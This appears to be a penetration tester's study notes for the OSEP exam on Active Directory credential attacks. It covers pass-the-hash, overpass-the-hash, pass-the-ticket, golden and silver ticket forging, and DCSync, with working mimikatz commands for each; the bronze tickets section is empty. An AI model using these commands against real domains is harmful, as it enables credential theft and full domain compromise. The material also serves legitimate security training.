(Although the techniques explained here aren't teached in the OSEP, I found them pretty useful during my OSEP exam & labs, learning and researching
about them also helped me improve my knowlegde of Active Directory which is always useful)

**PASS THE HASH:**

The pass-the-hash techinque allows an attacker to authenticate to remote systems using the user NTLM hash(the static part, also known as NT hash). 
Note that the pass-the-hash technique only applies to Windows/NTLM authentication and not to Kerberos authentication.

There are lots of tools that support pass-the-hash. For example all the impacket suite supports it, xfreerdp also does, mimikatz also does, and the
list keeps going on...

Passing the hash from bare bones *nix systems using [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit/tree/master).

**OVERPASS THE HASH:**

Overpass the hash, presented in the [blackhat](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf). This technique allows an attacker to get a TGT using only the NTLM hash of the user. 

We can for example use overpass the hash through [mimikatz](https://github.com/gentilkiwi/mimikatz):

```
mimikatz # sekurlsa::pth /user:user1 /domain:contoso.com /ntlm:<ntlm_hash> /run:PowerShell.exe
```

Once we have the new powershell session, we can authenticate to any AD resource to obtain a TGT, here's an example:

```
PS C:\> klist  -> no TGT for the user1

PS C:\> net use \\dc01.contoso.com

PS C:\> klist -> TGT for the user1
```

**PASS THE TICKET:**

The pass-the-ticket technique abuses the TGS, which can be exported and injected somewhere else.

```
Listing tickets with mimikatz:

mimikatz # kerberos::list


Exporting all tickets(TGTs and TGSs) with mimikatz:

mimikatz # sekurlsa::tickets /export   


Injecting some ticket into memory with mimikatz:

mimikatz # kerberos::ptt 'C:\ticket.kirbi'
```

**GOLDEN TICKETS:**

With golden tickets, we can create TGTs for any domain resource that we want, and stating the groups we want. However to execute this attack we need the "krbtgt" domain account NTLM hash/password. Note that this attack is mostly used when you are already Domain Admin rather than trying to become one.

Now, armed with the "krbtgt" NTLM hash, we can proceed and craft our golden ticket with mimikatz:

```
mimikatz # kerberos::purge

mimikatz # kerberos::golden /user:trike /domain:contoso.com /sid:<our_sid_without_the_rid_part> /krbtgt:<ntlm_hash_of_krbtgt> /ptt
(mimikatz by default will assing us the RID of 500, however we can set a custom one via the "/id" parameter)

mimikatz # misc::cmd -> launcing a new cmd with our new TGT
```

**SILVER TICKETS:**

This technique consists of crafting a TGS with the password hash of the SPN. The interesting part about this TGS, is that we can modify our permissions(such as user id or group id) stating that we are local administrator/domain admin/etc on the server where the SPN we have compromised is running its service. 

In our example, our compromimsed SPN will we "svc_mssql", its NTLM password hash will be this "1BF1DE6AEDB12AE1E548210EDBF3511E", its FQDN will be "MSSQL/server.contoso.com" and the SID of the trike user will be "S-1-5-21-2602875597-2787548311-2599479668-1204"

```
mimikatz # kerberos::purge
Ticket(s) purge for current session is OK

mimikatz # kerberos::list

mimikatz # kerberos::golden /user:trike /domain:contoso.com /sid:S-1-5-21-2602875597-2787548311-2599479668 /target:server.contoso.com /service:MSSQL /rc4:1BF1DE6AEDB12AE1E548210EDBF3511E /ptt
```
(note that in the sid parameter we didn't specify the RID of the trike user, since mimikatz will automatically set our RID to 500 which equals to both local administrator and domain admin)

**BRONZE TICKETS:**


**DOMAIN CONTROLLER SYNCHRONIZATION:**

This is an alternative way to get any domain user hash without dumping the entire NTDS.dit database. For this reason DcSync is way stealthier. 

This attack works because the domain controller recieving the request doesn't verify that the request came from a know domain controller, only that the SID has the appropiate permissions to do so. For this reason, if a domain admin sends a request to a domain controller, this will likely succeed. 

We can perform this attack with mimikatz:

```
mimikatz # lsadump::dcsync /user:Administrator

mimikatz # lsadump::dcsync /user:krbtgt
```
